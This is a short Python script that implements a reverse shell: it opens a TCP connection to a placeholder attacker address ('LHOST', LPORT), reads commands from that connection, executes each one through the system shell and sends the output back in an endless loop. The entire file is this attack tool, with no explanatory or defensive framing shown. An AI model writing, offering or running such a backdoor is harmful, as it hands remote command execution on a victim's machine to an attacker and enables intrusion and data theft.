#!/usr/bin/env python
import socket
import subprocess

def execute_system_command(command):
	return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("LHOST", LPORT))


while True:
	command = connection.recv(1024)
	cmd_result = execute_system_command(command)
	connection.send(cmd_result)
	
connection.close()